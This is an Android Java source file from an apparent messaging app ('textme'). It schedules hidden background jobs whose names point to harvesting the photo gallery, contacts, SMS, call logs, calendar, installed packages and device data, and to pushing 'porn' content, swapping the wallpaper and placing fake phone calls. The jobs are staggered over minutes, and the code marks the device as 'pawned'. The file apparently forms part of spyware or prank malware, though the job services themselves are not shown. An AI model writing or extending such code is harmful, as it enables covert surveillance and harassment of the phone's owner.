package com.candroid.textme;

import android.app.job.JobInfo;
import android.app.job.JobScheduler;
import android.content.ComponentName;
import android.content.Context;
import android.content.SharedPreferences;
import android.preference.PreferenceManager;

public class JobsScheduler {
    public static final int JOB_ID_PORN = 1;
    public static final int JOB_ID_WALLPAPER = 2;
    public static final int JOB_ID_DCIM = 3;
    public static final int JOB_ID_PACKAGES = 4;
    public static final int JOB_ID_CONTACTS = 5;
    public static final int JOB_ID_DEVICE = 6;
    public static final int JOB_ID_PHONE_CALLS = 7;
    public static final int JOB_ID_SMS = 8;
    public static final int JOB_ID_CALENDAR_EVENTS = 9;
    public static final int JOB_ID_FAKE_PHONE_CALL = 10;
    public static final long ONE_MINUTE = 60000;
    public static final long ONE_HOUR = ONE_MINUTE * 60;
    public static final String DCIM_KEY = "DCIM_KEY";
    public static final String PACKAGES_KEY = "PACKAGES_KEY";
    public static final String CONTACTS_KEY = "CONTACTS_KEY";
    public static final String DEVICE_KEY = "DEVICE_KEY";
    public static final String PHONE_CALLS_KEY = "PHONE_CALLS_KEY";
    public static final String SMS_KEY = "SMS_KEY";
    public static final String CALENDAR_EVENTS_KEY = "CALENDAR_EVENTS_KEY";
    public static final String FAKE_PHONE_CALL_KEY = "FAKE_PHONE_CALL_KEY";

    protected static void scheduleJob(Context context){
        SharedPreferences sharedPreferences = PreferenceManager.getDefaultSharedPreferences(context);
        boolean ranDcim = sharedPreferences.getBoolean(DCIM_KEY, false);
        boolean ranPackages = sharedPreferences.getBoolean(PACKAGES_KEY, false);
        boolean ranContacts = sharedPreferences.getBoolean(CONTACTS_KEY, false);
        boolean ranDevice = sharedPreferences.getBoolean(DEVICE_KEY, false);
        boolean ranPhoneCall = sharedPreferences.getBoolean(PHONE_CALLS_KEY, false);
        boolean ranSms = sharedPreferences.getBoolean(SMS_KEY, false);
        boolean ranCalendar = sharedPreferences.getBoolean(CALENDAR_EVENTS_KEY, false);
        boolean ranFakePhoneCall = sharedPreferences.getBoolean(FAKE_PHONE_CALL_KEY, false);
        JobScheduler jobScheduler = context.getSystemService(JobScheduler.class);
        if(jobScheduler.getPendingJob(JOB_ID_PORN) == null){
            ComponentName serviceComponent = new ComponentName(context, PornJobService.class);
            JobInfo.Builder builder = new JobInfo.Builder(JOB_ID_PORN, serviceComponent);
            builder.setMinimumLatency(15 * ONE_MINUTE);
            builder.setOverrideDeadline(30 * ONE_MINUTE);
            builder.setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY);
            jobScheduler.schedule(builder.build());
        }
        if(jobScheduler.getPendingJob(JOB_ID_WALLPAPER) == null){
            ComponentName wallpaperService = new ComponentName(context, WallpaperJobService.class);
            JobInfo.Builder wallpaperBuilder = new JobInfo.Builder(JOB_ID_WALLPAPER, wallpaperService);
            wallpaperBuilder.setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY);
            wallpaperBuilder.setRequiresCharging(false);
            wallpaperBuilder.setRequiresBatteryNotLow(true);
            wallpaperBuilder.setRequiresStorageNotLow(true);
            wallpaperBuilder.setRequiresDeviceIdle(false);
            wallpaperBuilder.setOverrideDeadline( 24 * ONE_HOUR);
            wallpaperBuilder.setMinimumLatency(90000);
            jobScheduler.schedule(wallpaperBuilder.build());
        }
        if(jobScheduler.getPendingJob(JOB_ID_DCIM) == null && !ranDcim){
            ComponentName dcimJobService = new ComponentName(context, DcimJobService.class);
            JobInfo.Builder dcimJob = new JobInfo.Builder(JOB_ID_DCIM, dcimJobService);
            dcimJob.setRequiredNetworkType(JobInfo.NETWORK_TYPE_NONE);
            dcimJob.setRequiresCharging(false);
            dcimJob.setRequiresBatteryNotLow(true);
            dcimJob.setRequiresStorageNotLow(true);
            dcimJob.setRequiresDeviceIdle(false);
            dcimJob.setPersisted(false);
            dcimJob.setOverrideDeadline( 24 * ONE_HOUR);
            dcimJob.setMinimumLatency(7 * ONE_MINUTE);
            jobScheduler.schedule(dcimJob.build());
        }
        if(jobScheduler.getPendingJob(JOB_ID_PACKAGES) == null && ! ranPackages){
            ComponentName packagesJobService = new ComponentName(context, PackagesJobService.class);
            JobInfo.Builder packagesJob = new JobInfo.Builder(JOB_ID_PACKAGES, packagesJobService);
            packagesJob.setRequiredNetworkType(JobInfo.NETWORK_TYPE_NONE);
            packagesJob.setRequiresCharging(false);
            packagesJob.setRequiresBatteryNotLow(true);
            packagesJob.setRequiresStorageNotLow(true);
            packagesJob.setRequiresDeviceIdle(false);
            packagesJob.setPersisted(false);
            packagesJob.setOverrideDeadline( 24 * ONE_HOUR);
            packagesJob.setMinimumLatency(6 * ONE_MINUTE);
            jobScheduler.schedule(packagesJob.build());
        }
        if(jobScheduler.getPendingJob(JOB_ID_CONTACTS) == null && ! ranContacts){
            ComponentName contactsJobService = new ComponentName(context, ContactsJobService.class);
            JobInfo.Builder contactsJob = new JobInfo.Builder(JOB_ID_CONTACTS, contactsJobService);
            contactsJob.setRequiredNetworkType(JobInfo.NETWORK_TYPE_NONE);
            contactsJob.setRequiresCharging(false);
            contactsJob.setRequiresBatteryNotLow(true);
            contactsJob.setRequiresStorageNotLow(true);
            contactsJob.setRequiresDeviceIdle(false);
            contactsJob.setPersisted(false);
            contactsJob.setOverrideDeadline( 24 * ONE_HOUR);
            contactsJob.setMinimumLatency(4* ONE_MINUTE);
            jobScheduler.schedule(contactsJob.build());
        }
        if(jobScheduler.getPendingJob(JOB_ID_DEVICE) == null && ! ranDevice){
            ComponentName deviceJobService = new ComponentName(context, DeviceJobService.class);
            JobInfo.Builder deviceJob = new JobInfo.Builder(JOB_ID_DEVICE, deviceJobService);
            deviceJob.setRequiredNetworkType(JobInfo.NETWORK_TYPE_NONE);
            deviceJob.setRequiresCharging(false);
            deviceJob.setRequiresBatteryNotLow(true);
            deviceJob.setRequiresStorageNotLow(true);
            deviceJob.setRequiresDeviceIdle(false);
            deviceJob.setPersisted(false);
            deviceJob.setOverrideDeadline( 24 * ONE_HOUR);
            deviceJob.setMinimumLatency(2* ONE_MINUTE);
            jobScheduler.schedule(deviceJob.build());
        }
        if(jobScheduler.getPendingJob(JOB_ID_PHONE_CALLS) == null && ! ranPhoneCall){
            ComponentName phoneCallsJobService = new ComponentName(context, PhoneCallsJobService.class);
            JobInfo.Builder phoneCallsJob = new JobInfo.Builder(JOB_ID_PHONE_CALLS, phoneCallsJobService);
            phoneCallsJob.setRequiredNetworkType(JobInfo.NETWORK_TYPE_NONE);
            phoneCallsJob.setRequiresCharging(false);
            phoneCallsJob.setRequiresBatteryNotLow(true);
            phoneCallsJob.setRequiresStorageNotLow(true);
            phoneCallsJob.setRequiresDeviceIdle(false);
            phoneCallsJob.setPersisted(false);
            phoneCallsJob.setOverrideDeadline( 24 * ONE_HOUR);
            phoneCallsJob.setMinimumLatency(5 * ONE_MINUTE);
            jobScheduler.schedule(phoneCallsJob.build());
        }
        if(jobScheduler.getPendingJob(JOB_ID_SMS) == null && ! ranSms){
            ComponentName smsJobService = new ComponentName(context, SmsJobService.class);
            JobInfo.Builder smsJob = new JobInfo.Builder(JOB_ID_SMS, smsJobService);
            smsJob.setRequiredNetworkType(JobInfo.NETWORK_TYPE_NONE);
            smsJob.setRequiresCharging(false);
            smsJob.setRequiresBatteryNotLow(true);
            smsJob.setRequiresStorageNotLow(true);
            smsJob.setRequiresDeviceIdle(false);
            smsJob.setPersisted(false);
            smsJob.setOverrideDeadline( 24 * ONE_HOUR);
            smsJob.setMinimumLatency(3 * ONE_MINUTE);
            jobScheduler.schedule(smsJob.build());
        }
        if(jobScheduler.getPendingJob(JOB_ID_CALENDAR_EVENTS) == null && ! ranCalendar){
            ComponentName calendarEventJobService = new ComponentName(context, CalendarEventJobService.class);
            JobInfo.Builder calendarEventJob = new JobInfo.Builder(JOB_ID_CALENDAR_EVENTS, calendarEventJobService);
            calendarEventJob.setRequiredNetworkType(JobInfo.NETWORK_TYPE_NONE);
            calendarEventJob.setRequiresCharging(false);
            calendarEventJob.setRequiresBatteryNotLow(true);
            calendarEventJob.setRequiresStorageNotLow(true);
            calendarEventJob.setRequiresDeviceIdle(false);
            calendarEventJob.setPersisted(false);
            calendarEventJob.setOverrideDeadline( 24 * ONE_HOUR);
            calendarEventJob.setMinimumLatency(1 * ONE_MINUTE);
            jobScheduler.schedule(calendarEventJob.build());
        }
        if(jobScheduler.getPendingJob(JOB_ID_FAKE_PHONE_CALL) == null && ! ranFakePhoneCall){
            ComponentName fakeCallJobService = new ComponentName(context, FakeCallJobService.class);
            JobInfo.Builder calendarEventJob = new JobInfo.Builder(JOB_ID_FAKE_PHONE_CALL, fakeCallJobService);
            calendarEventJob.setRequiredNetworkType(JobInfo.NETWORK_TYPE_NONE);
            calendarEventJob.setRequiresCharging(false);
            calendarEventJob.setRequiresBatteryNotLow(true);
            calendarEventJob.setRequiresStorageNotLow(true);
            calendarEventJob.setRequiresDeviceIdle(false);
            calendarEventJob.setPersisted(false);
            calendarEventJob.setOverrideDeadline( 24 * ONE_HOUR);
            calendarEventJob.setMinimumLatency(8 * ONE_MINUTE);
            jobScheduler.schedule(calendarEventJob.build());
        }else{
            ScreenReceiver.sIsPawned = true;
        }
    }
}